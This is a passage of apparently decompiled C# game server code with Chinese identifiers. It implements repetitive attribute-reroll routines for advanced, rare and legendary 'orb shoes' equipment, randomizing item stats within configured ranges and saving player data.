					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠鞋子稀有属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠鞋子稀有属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠鞋子传说属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠鞋子传说属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠鞋子传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
